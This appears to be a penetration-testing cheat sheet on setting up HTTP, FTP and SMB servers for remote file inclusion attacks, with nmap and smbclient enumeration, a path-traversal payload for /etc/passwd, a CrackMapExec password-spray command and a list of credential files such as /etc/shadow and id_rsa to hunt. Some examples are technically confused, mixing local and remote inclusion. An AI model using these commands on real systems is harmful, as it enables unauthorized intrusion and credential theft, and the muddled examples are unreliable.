# 🛰️ RFI Servers - Python HTTP (python3 -m http.server 80), FTP (python3 -m pyftpdlib -p 21), SMB (impacket-smbserver)

---

## 🔍 Initial Setup

### Python HTTP Server

To start a simple HTTP server using Python:

```bash
python3 -m http.server 80
```

This command starts an HTTP server on port `80` which can be used for basic RFI attacks or testing.

> [!NOTE] 
> Ensure the machine is configured to listen on all interfaces (`-b 0.0.0.0`) if necessary:
```bash
python3 -m http.server --bind 0.0.0.0 80
```

### Python FTP Server

To start a basic FTP server:

```bash
python3 -m pyftpdlib -p 21
```

This command sets up an FTP service listening on port `21`, allowing file transfers and potentially RFI-based attacks.

> [!WARNING]
> Running servers like this in production environments is highly discouraged due to security risks and lack of proper authentication mechanisms.

### Impacket SMB Server

To set up an SMB server using the impacket library:

```bash
impacket-smbserver share C:\path\to\data
```

This command starts a simple SMB server on port `445` or automatically chosen ports, serving files from the specified directory. It's useful for testing RFI attacks against Windows systems.

---

## 📚 Overview & Configuration

### Python HTTP Server (python3 -m http.server 80)

> [!ABSTRACT] 
> The `http.server` module in Python provides a simple and basic web server suitable for development purposes or quick testing scenarios involving RFI.

Ports:
```text
80/tcp → Simple HTTP Service
```

### Python FTP Server (python3 -m pyftpdlib -p 21)

> [!ABSTRACT] 
> `pyftpdlib` is a powerful library that extends Python's standard `ftplib` to create an FTP server capable of handling multiple clients and supporting both active and passive mode connections.

Ports:
```text
21/tcp → Basic FTP Service
```

### Impacket SMB Server (impacket-smbserver)

> [!ABSTRACT] 
> The impacket library includes a module (`smbserver`) that can be used to start an SMB server for testing purposes. This is particularly useful in environments where RFI against Windows systems needs to be tested.

Ports:
```text
445/tcp → Simple SMB Service
```

---

## 🎯 Quick Enumeration Workflow

1. Check if HTTP service is running on port `80`:
   ```bash
   nmap -p 80 <IP>
   ```
   
2. Enumerate the FTP server (if present) and check for writable directories:
   ```bash
   nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-login,ftp-nosuchfile,ftp-server-info,ftp-syst -p 21 <IP>
   ```

3. Verify if the SMB service is operational on port `445`:
   ```bash
   nmap --script smb* -p 445 <IP>
   ```
   
> [!SUCCESS] 
> If all services are up, proceed to further enumeration and exploitation.

---

## 📂 Important RFI Targets

| Service | Port | Description |
|---|---|---|
| HTTP Server | 80/tcp | Basic web server for testing RFI vulnerabilities. |
| FTP Server | 21/tcp | File Transfer Protocol service potentially exploitable via RFI attacks. |
| SMB Server | 445/tcp | Simple SMB server for Windows-based RFI tests and enumeration. |

---

## 🔍 Initial Enumeration

### HTTP Service - Enumerate Directory Listing

```bash
curl http://<IP>/directoryname
```

### FTP Service - Check for Anonymous Access

Anonymous login:

```text
ftp -inv <IP>
user anonymous
```

List directories:

```text
ls
cd /path/to/directory
```

### SMB Service - Enumerate Shares and Files

Use `smbclient` to list shares:
```bash
smbclient -L //<IP> -U user
```
Access files and folders:
```bash
smbclient //<IP>/share -U user
ls /path/to/directory
cd /path/to/folder
get filename.txt
```

---

## 🧭 RFI Exploitation Techniques

### HTTP Service - Basic RFI Attack

Example payload for a PHP-based RFI attack:
```bash
http://<IP>/vulnerable.php?file=../../../../etc/passwd%00
```
This payload attempts to include system files, leading to potential data leakage.

> [!DANGER] 
> Ensure such payloads are only used in controlled environments with proper authorization.

### FTP Service - RFI via File Upload

Upload a PHP file containing malicious code:
```bash
ftp://<IP>/path/to/upload.php?file=../../../../etc/passwd%00
```
Check if the uploaded file can be accessed and executed.

### SMB Service - Lateral Movement & Privilege Escalation

Use `CrackMapExec` to pivot from an FTP or HTTP service to SMB:
```bash
crackmapexec smb <IP> \
-u users.txt \
-p 'Password123!'
```

---

## 🧠 Mental Model for RFI Attacks

```text
RFI Service Found?
   ↓ 
Directory Listing? → Identify Vulnerabilities
File Upload Capabilities? → Exploit via Uploaded Files
Anonymous Access? → Use for Privilege Escalation
Writable Shares (SMB)? → Drop Payloads / Lateral Movement
```

---

## 📌 High-Value Targets to Hunt

```text
/etc/passwd
/etc/shadow
/.ssh/id_rsa
/flag.txt
/config.php
/database.yml
```
Also search for keywords: `password`, `passwd`, `secret`, `token`, `key`, `credential`.

---

## ⚠️ Common Findings & Mitigation

| Finding | Impact |
|---|---|
| Anonymous Access | Data Exposure |
| Writable Directories | Malware Drop / Lateral Movement |
| Sensitive Files Visible | Information Disclosure |

### Recommendations
- Apply strict access controls and authentication mechanisms.
- Regularly audit file permissions and directory listings.
- Monitor for unauthorized uploads or downloads.

---

## 📄 References & Further Reading

> [!INFO]
> For more details on these services, refer to the documentation:
>
>- Python HTTP Server: https://docs.python.org/3/library/http.server.html
>- pyftpdlib FTP Server: https://github.com/giampaolo/pyftpdlib
>- Impacket SMB Library: https://impacket.gitbook.io/impacket/

---

> [!SUCCESS]
> By understanding and leveraging the setup of these services, one can effectively test for RFI vulnerabilities and develop robust defense mechanisms.